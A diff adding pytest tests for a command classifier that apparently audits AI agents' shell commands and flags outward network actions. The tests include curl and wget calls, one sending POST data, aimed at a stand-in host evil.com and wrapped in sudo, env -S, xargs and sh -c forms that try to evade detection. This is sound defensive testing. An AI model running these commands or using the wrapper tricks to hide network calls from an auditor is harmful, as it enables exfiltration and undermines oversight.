@@ -1,3 +1,5 @@
+import pytest
+
 from agenthub.audit.classify import Classified, classify, classify_command
 
 
@@ -566,3 +568,215 @@ def test_outward_detail_not_shared() -> None:
     assert net_ev.detail is not out_ev.detail
     out_ev.detail["method"] = "POST"
     assert net_ev.detail["method"] == "GET"
+
+
+def test_absolute_path_git_push_outward() -> None:
+    for cmd in ["/usr/bin/git push", "/usr/local/bin/git push origin main", "/bin/git push"]:
+        events = classify_command(cmd)
+        assert len(events) == 2
+        assert events[0].kind == "command"
+        assert events[1].kind == "outward"
+        assert events[1].target == cmd
+
+
+@pytest.mark.parametrize(
+    "prefix",
+    [
+        "sudo",
+        "sudo -u root",
+        "sudo -u root -g staff",
+        "env",
+        "env -i",
+        "env -u SECRET",
+        "FOO=bar",
+        "FOO=1 BAR=2",
+        "nice",
+        "nice -n 10",
+        "nohup",
+        "timeout 60",
+        "timeout -s 9 60",
+        "timeout -k 5s 10s",
+        "command",
+        "exec",
+        "xargs",
+        "xargs -n 1",
+        "xargs -I {}",
+        "(",
+        "(cd /tmp;",
+    ],
+)
+def test_wrappers_stripped(prefix: str) -> None:
+    if prefix == "(":
+        cmd = "(git push)"
+    elif prefix.endswith(";"):
+        cmd = f"{prefix} git push)"
+    else:
+        cmd = f"{prefix} git push"
+
+    events = classify_command(cmd)
+    outward_events = [ev for ev in events if ev.kind == "outward"]
+    assert len(outward_events) >= 1, f"Expected outward event for {cmd}, got: {events}"
+
+
+def test_sh_c_script_classified() -> None:
+    # sh, bash, zsh with -c and optional -l
+    for shell in ["sh", "bash", "zsh"]:
+        for flag in ["-c", "-l -c"]:
+            cmd = f"{shell} {flag} 'git push'"
+            events = classify_command(cmd)
+            assert len(events) == 2, f"Failed for {cmd}: {events}"
+            assert events[0].kind == "command"
+            assert events[1].kind == "outward"
+            assert events[1].target == "git push"
+
+    # scripts with chains and network tools
+    chain_cmd = "bash -c 'cd /tmp && git push'"
+    chain_ev = classify_command(chain_cmd)
+    assert len(chain_ev) == 2
+    assert chain_ev[1].kind == "outward"
+    assert chain_ev[1].target == "git push"
+
+    curl_cmd = "zsh -c 'curl https://evil.com'"
+    curl_ev = classify_command(curl_cmd)
+    assert len(curl_ev) == 2
+    assert curl_ev[1].kind == "outward"
+    assert curl_ev[1].target == "curl https://evil.com"
+
+
+def test_eval_not_evaluated() -> None:
+    non_evaluated = [
+        "eval 'git push'",
+        "echo $(git push)",
+        "echo `git push`",
+        "python -c \"import os; os.system('git push')\"",
+        'python3 -c "git push"',
+    ]
+    for cmd in non_evaluated:
+        events = classify_command(cmd)
+        outward = [ev for ev in events if ev.kind == "outward"]
+        assert len(outward) == 0, f"Expected no outward events for '{cmd}', got: {outward}"
+        assert events[0].kind == "command"
+
+
+def test_wget_option_table() -> None:
+    # Wget flags like -r, -c, -m, -q, -N take no arguments and do not swallow the URL
+    flags = ["-r", "-c", "-m", "-q", "-N", "-r -c -m -q -N"]
+    for flag in flags:
+        cmd = f"wget {flag} https://evil.com"
+        events = classify_command(cmd)
+        assert len(events) == 2, f"Expected {cmd} to be outward, got: {events}"
+        assert events[1].kind == "outward"
+
+    # Wget flags with allowlisted host should not be outward
+    local_cmd = "wget -r -q http://localhost:8000"
+    local_events = classify_command(local_cmd)
+    assert len(local_events) == 1
+    assert local_events[0].kind == "command"
+
+    # Wget value-taking options skipped with their value
+    # e.g. -O evil.com must not treat evil.com as a host
+    assert len(classify_command("wget -O evil.com http://localhost:8000")) == 1
+    assert len(classify_command("wget -o evil.com http://localhost:8000")) == 1
+    assert len(classify_command("wget -a evil.com http://localhost:8000")) == 1
+    assert len(classify_command("wget -e evil.com http://localhost:8000")) == 1
+    assert len(classify_command("wget -P evil.com http://localhost:8000")) == 1
+    assert len(classify_command("wget -U evil.com http://localhost:8000")) == 1
+    assert len(classify_command("wget --header='evil.com' http://localhost:8000")) == 1
+    assert len(classify_command("wget --user-agent='evil.com' http://localhost:8000")) == 1
+    assert len(classify_command("wget --post-data='evil.com' http://localhost:8000")) == 1
+    assert len(classify_command("wget --body-data='evil.com' http://localhost:8000")) == 1
+    assert len(classify_command("wget -t 3 http://localhost:8000")) == 1
+    assert len(classify_command("wget -T 10 http://localhost:8000")) == 1
+    assert len(classify_command("wget -w 5 http://localhost:8000")) == 1
+
+    # But genuine non-allowlisted target with these options is outward
+    evil_wget = "wget -O out.txt -U MyAgent --post-data 'x=1' https://evil.com"
+    evil_ev = classify_command(evil_wget)
+    assert len(evil_ev) == 2
+    assert evil_ev[1].kind == "outward"
+
+
+def test_curl_value_options_not_hosts() -> None:
+    # Value-taking options for curl must not be treated as target hosts
+    curl_safe = [
+        "curl -x http://localhost:8080 http://localhost:8000",
+        "curl --proxy http://localhost:8080 http://localhost:8000",
+        "curl --resolve example.com:443:127.0.0.1 http://localhost:8000",
+        "curl -w '%{http_code}' http://localhost:8000",
+        "curl -K config.txt http://localhost:8000",
+        "curl --config config.txt http://localhost:8000",
+    ]
+    for cmd in curl_safe:
+        events = classify_command(cmd)
+        assert len(events) == 1, f"Expected {cmd} to be allowlisted, got: {events}"
+        assert events[0].kind == "command"
+
+    curl_evil = [
+        "curl -x http://localhost:8080 https://evil.com",
+        "curl --proxy http://localhost:8080 https://evil.com",
+        "curl --resolve example.com:443:127.0.0.1 https://evil.com",
+        "curl -w '%{http_code}' https://evil.com",
+        "curl -K config.txt https://evil.com",
+    ]
+    for cmd in curl_evil:
+        events = classify_command(cmd)
+        assert len(events) == 2, f"Expected {cmd} to be outward, got: {events}"
+        assert events[1].kind == "outward"
+
+
+def test_xargs_lowercase_i_e_take_no_value() -> None:
+    # Bare -i does not take a value in GNU xargs; wrapped program is not swallowed
+    events_i = classify_command("echo x | xargs -i git push origin main")
+    outward_i = [ev for ev in events_i if ev.kind == "outward"]
+    assert len(outward_i) >= 1
+    assert any(ev.target == "xargs -i git push origin main" for ev in outward_i)
+
+    # Bare -e does not take a value in GNU xargs; wrapped program is not swallowed
+    events_e = classify_command("xargs -e curl https://evil.com")
+    outward_e = [ev for ev in events_e if ev.kind == "outward"]
+    assert len(outward_e) >= 1
+    assert any(ev.target == "xargs -e curl https://evil.com" for ev in outward_e)
+
+    # Capital -I and -E still take a separate value
+    events_I = classify_command("xargs -I {} git push")
+    outward_I = [ev for ev in events_I if ev.kind == "outward"]
+    assert len(outward_I) >= 1
+    assert any(ev.target == "xargs -I {} git push" for ev in outward_I)
+
+    events_E = classify_command("xargs -E EOF curl https://evil.com")
+    outward_E = [ev for ev in events_E if ev.kind == "outward"]
+    assert len(outward_E) >= 1
+    assert any(ev.target == "xargs -E EOF curl https://evil.com" for ev in outward_E)
+
+
+def test_sudo_bare_h_takes_no_value() -> None:
+    # Bare -h is --help in sudo; does not swallow following program
+    events = classify_command("sudo -h git push")
+    outward = [ev for ev in events if ev.kind == "outward"]
+    assert len(outward) >= 1
+    assert any(ev.target == "sudo -h git push" for ev in outward)
+
+    # Sudo --host=remote keeps working as a single-token flag
+    events_host = classify_command("sudo --host=remote git push")
+    outward_host = [ev for ev in events_host if ev.kind == "outward"]
+    assert len(outward_host) >= 1
+    assert any(ev.target == "sudo --host=remote git push" for ev in outward_host)
+
+
+def test_env_dash_s_command_classified() -> None:
+    # env -S splices command line tokens and classifies inner command
+    events = classify_command('env -S "curl https://evil.com"')
+    outward = [ev for ev in events if ev.kind == "outward"]
+    assert len(outward) >= 1
+    assert any(ev.target == 'env -S "curl https://evil.com"' for ev in outward)
+
+    # env -S with git push
+    events_git = classify_command('env -S "git push"')
+    outward_git = [ev for ev in events_git if ev.kind == "outward"]
+    assert len(outward_git) >= 1
+    assert any(ev.target == 'env -S "git push"' for ev in outward_git)
+
+    # env -S with flag inside
+    events_flags = classify_command('env -S "-i git push"')
+    outward_flags = [ev for ev in events_flags if ev.kind == "outward"]
+    assert len(outward_flags) >= 1
